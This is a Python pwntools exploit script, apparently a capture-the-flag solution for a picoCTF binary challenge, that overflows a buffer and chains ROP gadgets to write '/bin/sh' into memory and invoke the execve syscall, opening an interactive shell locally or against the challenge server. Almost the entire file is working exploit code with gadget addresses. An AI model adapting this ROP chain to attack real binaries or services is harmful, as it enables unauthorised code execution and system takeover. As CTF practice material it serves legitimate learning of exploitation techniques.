#!/usr/bin/env python3
 
from pwn import *

def convertASCII_to_Hex(value):
      res = ""
      for i in value:
            res += hex(ord(i))[2:]
      return res      

def changeEndian(value):
      length = len(value)
      res = "0x"
      for i in range(length-1, 0, -2):
            res += value[i-1]+ value[i]
      return res      

def generateString(value):
      return int(changeEndian(convertASCII_to_Hex(value)), 16)   

# win the game
def generatePayload():
    """
    - Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
        [+] Gadget found: 0x410ca3 pop rsi ; ret
        [+] Gadget found: 0x4163f4 pop rax ; ret
        [+] Gadget found: 0x445950 xor rax, rax ; ret

    - Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x445950 xor rax, rax ; ret
        [+] Gadget found: 0x475430 add rax, 1 ; ret
        [+] Gadget found: 0x475431 add eax, 1 ; ret

    - Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x400696 pop rdi ; ret
        [+] Gadget found: 0x410ca3 pop rsi ; ret
        [+] Gadget found: 0x44a6b5 pop rdx ; ret

    - Step 4 -- Syscall gadget

        [+] Gadget found: 0x40137c syscall

    """
    offset = b'a' * 120
    pop_rsi = p64(0x410ca3)                         # pop rsi ; ret
    data_address = p64(0x00000000006bc3a0)          # data address to store the /bin/sh
    pop_rax = p64(0x4163f4)                         # pop rax ; ret
    bin_syscall = p64(generateString("/bin/sh"))    
    mov_rsi_rax = p64(0x47ff91)                     # mov qword ptr [rsi], rax ; ret
    pop_rdi = p64(0x400696)                         # pop rdi ; ret
    xor_rax_rax = p64(0x445950)
    pop_rdx = p64(0x44a6b5)
    syscall = p64(0x40137c)
    execv = p64(0x3b)                               # 0x3b = 59 in hexadecimal, it corresponds to the 
                                                    # identifier of the execv method

    """payload = (
    # Prepare for calling execv,
    # load the system call number of it (59) into RAX
    p64(POP_RAX) +
    p64(59) +
    # We do not have any arguments, load a null pointer into RSI
    p64(POP_RSI) +
    p64(0) +
    # We do not an environemnt, load a null pointer into RDX
    p64(POP_RDX) +
    p64(0) +
    """
    payload = offset + pop_rax + bin_syscall + pop_rsi + data_address + mov_rsi_rax + pop_rax + p64(0x3b) + pop_rdi + data_address + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall

    return payload

def main():
    elf = ELF('vuln')                #context.binary

    remote_or_local = input("Is it local or remote?:\n1 - Local\n2 - Remote\nYour option: ")

    if(int(remote_or_local) == 1):
        p = process(elf.path)
        p.sendline(b'84')
        p.sendline(generatePayload())
        p.interactive()
        
    elif(int(remote_or_local) == 2):
        p = remote('jupiter.challenges.picoctf.org', 42953)
        p.sendline(b'84')
        p.sendline(generatePayload())
        time.sleep(.5)
        p.interactive()

    else:
        print("That is not a correct option, exiting")

if __name__ == "__main__":
    main()
